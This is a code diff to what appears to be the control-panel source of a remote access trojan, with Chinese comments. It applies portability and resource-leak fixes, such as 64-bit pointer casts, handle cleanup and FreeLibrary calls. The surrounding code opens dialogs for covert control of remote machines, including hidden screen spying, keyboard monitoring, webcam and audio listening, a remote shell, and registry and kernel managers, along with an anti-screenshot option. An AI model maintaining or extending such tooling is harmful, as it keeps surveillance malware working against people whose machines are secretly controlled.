@@ -395,6 +395,7 @@ CMainFrame::CMainFrame()
 
 	// 启动子进程
 	BOOL ret = CreateProcess(NULL, str_log_Path.GetBuffer(), NULL, NULL, FALSE, 0, NULL, NULL, &si, pi);
+	if (ret) { CloseHandle(pi->hThread); pi->hThread = NULL; CloseHandle(pi->hProcess); pi->hProcess = NULL; }
 	DWORD iPid = GetCurrentProcessId();
 	//初始化日志
 	for (int i = 0; i < 50; i++)
@@ -657,6 +658,7 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 			HWND handle = this->GetSafeHwnd();
 			fnSetWindowDisplayAffinity(handle, 0x00000000); //0x00000000
 		}
+		FreeLibrary(User32handle);
 	}
 #endif // ANTISCREENSHOT
 
@@ -768,7 +770,7 @@ void CMainFrame::initializeSEU_QQwry()
 {
 	OUT_PUT_FUNCION_NAME_INFO
 		TCHAR DatPath[MAX_PATH] = { 0 };
-	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
+	GetModuleFileName(NULL, DatPath, MAX_PATH);
 	*_tcsrchr(DatPath, _T('\\')) = '\0';
 	CString cstrFileFullPath_qqwry;
 	cstrFileFullPath_qqwry = DatPath;
@@ -1616,7 +1618,7 @@ void CMainFrame::ProcessReceiveComplete(ClientContext* pContext)
 			break;
 		case	SCREENSPY_PLAY_DLG:		//娱乐屏幕
 			((H264CScreenSpyDlg*)dlg)->OnReceiveComplete();
-			break;;
+			break;
 		case	SCREENSPY_HIDE_DLG:		//后台屏幕
 			((CHideScreenSpyDlg*)dlg)->OnReceiveComplete();
 			break;
@@ -2270,7 +2272,7 @@ LRESULT CMainFrame::OnOpenshelldialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CShellDlg* dlg = new CShellDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SHELL_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SHELL, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2284,7 +2286,7 @@ LRESULT CMainFrame::OnOpenkeyboarddialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CKeyBoardDlg* dlg = new CKeyBoardDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = KEYBOARD_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2299,7 +2301,7 @@ LRESULT CMainFrame::OnOpenchatdialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CChat* dlg = new CChat(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = CHAT_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_CHAT, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2313,7 +2315,7 @@ LRESULT CMainFrame::OnOpenaudiodialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CAudioDlg* dlg = new CAudioDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = AUDIO_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_AUDIO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2327,7 +2329,7 @@ LRESULT CMainFrame::OnOpenmanagerdialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CFileManagerDlg* dlg = new CFileManagerDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = FILEMANAGER_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_FILE, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2341,7 +2343,7 @@ LRESULT CMainFrame::OnOpenregeditdialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CRegeditDlg* dlg = new CRegeditDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = REGEDIT_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_REGEDIT, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2355,7 +2357,7 @@ LRESULT CMainFrame::OnOpenproxydialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CProxyMapDlg* dlg = new CProxyMapDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = PROXY_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_PROXY, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2370,7 +2372,7 @@ afx_msg LRESULT CMainFrame::OnOpenwebcamdialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CWebCamDlg* dlg = new CWebCamDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = WEBCAM_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_VEDIO, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2387,16 +2389,18 @@ afx_msg LRESULT CMainFrame::OnOpenspeakerdialog(WPARAM wParam, LPARAM lParam)
 			HANDLE AvrtHandle
 			);
 	char nBhku[] = { 'A','v','R','e','v','e','r','t','M','m','T','h','r','e','a','d','C','h','a','r','a','c','t','e','r','i','s','t','i','c','s','\0' };
-	AvRevertMmThreadCharacteristicsT pAvRevertMmThreadCharacteristics = (AvRevertMmThreadCharacteristicsT)GetProcAddress(LoadLibrary(_T("avrt.dll")), nBhku);
+	HMODULE hAvrt = LoadLibrary(_T("avrt.dll"));
+	AvRevertMmThreadCharacteristicsT pAvRevertMmThreadCharacteristics = hAvrt ? (AvRevertMmThreadCharacteristicsT)GetProcAddress(hAvrt, nBhku) : NULL;
 	if (pAvRevertMmThreadCharacteristics == NULL)
 	{
 		MessageBox(_T("控制端在旧系统不支持扬声器监听功能"), _T("注意"));
 	}
+	if (hAvrt) FreeLibrary(hAvrt);
 
 	ClientContext* pContext = (ClientContext*)lParam;
 	CSpeakerDlg* dlg = new CSpeakerDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SPEAKER_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SPEAKER, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2411,7 +2415,7 @@ afx_msg LRESULT CMainFrame::OnOpensysinfodialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CMachineDlg* dlg = new CMachineDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = MACHINE_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_MACHINE, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2426,7 +2430,7 @@ afx_msg LRESULT CMainFrame::OnOpenkerneldialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CKernelDlg* dlg = new CKernelDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = KERNEL_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_KERNEL, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2440,7 +2444,7 @@ afx_msg LRESULT CMainFrame::OnOpenexpanddialog(WPARAM wParam, LPARAM lParam)
 		ClientContext* pContext = (ClientContext*)lParam;
 	CExpandDlg* dlg = new CExpandDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = EXPAND_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_EXPAND, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2455,7 +2459,7 @@ afx_msg LRESULT CMainFrame::OnOpencreenspydialog_dif(WPARAM wParam, LPARAM lPara
 		ClientContext* pContext = (ClientContext*)lParam;
 	CDifScreenSpyDlg* dlg = new CDifScreenSpyDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SCREENSPY_DIF_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SCREEN, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2469,7 +2473,7 @@ afx_msg LRESULT CMainFrame::OnOpencreenspydialog_quick(WPARAM wParam, LPARAM lPa
 		ClientContext* pContext = (ClientContext*)lParam;
 	CQuickScreenSpyDlg* dlg = new CQuickScreenSpyDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SCREENSPY_QUICK_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SCREEN, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2483,7 +2487,7 @@ afx_msg LRESULT CMainFrame::OnOpencreenspydialog_play(WPARAM wParam, LPARAM lPar
 		ClientContext* pContext = (ClientContext*)lParam;
 	H264CScreenSpyDlg* dlg = new H264CScreenSpyDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SCREENSPY_PLAY_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
@@ -2498,7 +2502,7 @@ afx_msg LRESULT CMainFrame::OnOpencreenspydialog_hide(WPARAM wParam, LPARAM lPar
 		ClientContext* pContext = (ClientContext*)lParam;
 	CHideScreenSpyDlg* dlg = new CHideScreenSpyDlg(this, g_pSocketBase, pContext);
 	pContext->m_Dialog[0] = SCREENSPY_HIDE_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	pContext->m_Dialog[1] = (ULONG_PTR)dlg;
 	dlg->Create(IDD_SCREEN, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
